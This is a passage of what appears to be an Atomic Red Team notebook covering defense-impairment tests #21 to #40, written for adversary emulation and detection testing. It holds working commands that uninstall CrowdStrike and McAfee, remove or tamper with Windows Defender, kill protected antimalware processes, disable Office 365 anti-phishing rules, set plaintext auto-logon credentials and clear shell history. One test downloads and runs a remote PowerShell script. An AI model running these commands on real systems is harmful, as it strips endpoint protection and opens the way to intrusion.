   "execution_count": null,
   "id": "56d98af7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "640ccbf4",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Stop and Remove Arbitrary Security Windows Service",
    "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStop-Service -Name McAfeeDLPAgentService\nRemove-Service -Name McAfeeDLPAgentService\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "957108d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "8876dd4f",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Uninstall Crowdstrike Falcon on Windows",
    "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff78bc12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "ecb6420b",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Folder",
    "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedpath= \"C:\\Temp\"\nAdd-MpPreference -ExclusionPath $excludedpath```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63d80933",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "a04621ab",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedpath= \"C:\\Temp\"\nRemove-MpPreference -ExclusionPath $excludedpath\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f26113e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "420959cf",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Tamper with Windows Defender Evade Scanning -Extension",
    "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedExts= \".exe\"\nAdd-MpPreference -ExclusionExtension  $excludedExts```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ddcc03f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "bbf7d437",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedExts= \".exe\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d3b21ef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a9442734",
   "metadata": {},
   "source": [
    "### Atomic Test #25 - Tamper with Windows Defender Evade Scanning -Process",
    "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedProcess = \"outlook.exe\"\nAdd-MpPreference -ExclusionProcess $excludedProcess```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "502a3eb6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "5c98a730",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$excludedProcess = \"outlook.exe\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fe9d532",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 25 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3afbe00a",
   "metadata": {},
   "source": "### Atomic Test #26 - office-365-Disable-AntiPhishRule\nUsing the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n\n**Supported Platforms:** office-365\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ExchangeOnlineManagement PowerShell module must be installed\n\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01770952",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 26 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2c6374f8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d07cf320",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "e3e26e5e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nif(\"None\" -ne \"\") {\n$secure_pwd = (\"None\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e64e6ab6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 26 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3509fe23",
   "metadata": {},
   "source": [
    "### Atomic Test #27 - Disable Windows Defender with DISM",
    "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nDism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c3b3a5b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "922601c9",
   "metadata": {},
   "source": "### Atomic Test #28 - Disable Defender Using NirSoft AdvancedRun\nInformation on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Advancedrun.exe must exist at #{AdvancedRun_Location}\n\n##### Check Prereq Commands:\n```powershell\nif(Test-Path -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d778c5f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "529f9aaf",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nTry {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(0){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "712c900e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "e7adff30",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nTry {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbffb31f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 28 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7ac05cde",
   "metadata": {},
   "source": "### Atomic Test #29 - Kill antimalware protected processes using Backstab\nBackstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Backstab64.exe should exist in ExtrnalPayloads Directory\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "650193f9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 29 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ba2f2850",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n MsMpEng.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1bdfbfb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "df67e550",
   "metadata": {},
   "source": [
    "### Atomic Test #30 - WinPwn - Kill the event log services for stealth",
    "Kill the event log services for stealth via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba049679",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 30"
  },
  {
   "cell_type": "markdown",
   "id": "7e034b61",
   "metadata": {},
   "source": [
    "### Atomic Test #31 - Tamper with Windows Defender ATP using Aliases - PowerShell",
    "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6fa2868e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 31"
  },
  {
   "cell_type": "markdown",
   "id": "22f33b04",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63f8db9c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 31 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "20259835",
   "metadata": {},
   "source": [
    "### Atomic Test #32 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
    "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f646b9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 32"
  },
  {
   "cell_type": "markdown",
   "id": "a28ed46c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b478fed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 32 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4eba66d0",
   "metadata": {},
   "source": [
    "### Atomic Test #33 - LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
    "LockBit Black - Use Registry Editor to turn on automatic logon\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51decd88",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 33"
  },
  {
   "cell_type": "markdown",
   "id": "f4c0344a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7d9ff77",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 33 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d6881b61",
   "metadata": {},
   "source": [
    "### Atomic Test #34 - LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
    "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d6fb43a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 34"
  },
  {
   "cell_type": "markdown",
   "id": "51e7f3dd",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1196789",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 34 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d2e241e7",
   "metadata": {},
   "source": [
    "### Atomic Test #35 - Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
    "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "462c6ab2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 35"
  },
  {
   "cell_type": "markdown",
   "id": "b3d0e42e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee44cc33",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 35 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c9e734fb",
   "metadata": {},
   "source": [
    "### Atomic Test #36 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
    "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a0263ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 36"
  },
  {
   "cell_type": "markdown",
   "id": "2edf8c46",
   "metadata": {},
   "source": [
    "### Atomic Test #37 - WMIC Tamper with Windows Defender Evade Scanning Folder",
    "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1924ae74",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 37"
  },
  {
   "cell_type": "markdown",
   "id": "97136a4f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nwmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e2c6a61c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 37 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a2740584",
   "metadata": {},
   "source": "### Atomic Test #38 - Delete Windows Defender Scheduled Tasks\nThe following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: The Windows Defender scheduled tasks must be backed up first\n\n##### Check Prereq Commands:\n```cmd\nIF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n\n```\n##### Get Prereq Commands:\n```cmd\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bcfe7659",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "56e571a4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nIF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15a75dd9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38"
  },
  {
   "cell_type": "markdown",
   "id": "2f0d3e2e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nschtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6809b09",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 38 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "96a26557",
   "metadata": {},
   "source": [
    "### Atomic Test #39 - Clear History",
    "Clear Shell History. This technique only affect the bash shell application. \n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nhistory -c\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7701692c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 39"
  },
  {
   "cell_type": "markdown",
   "id": "b1e0f79a",
   "metadata": {},
   "source": [
    "### Atomic Test #40 - Suspend History",
    "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nset +o history\n```"
   ]
  },
  {
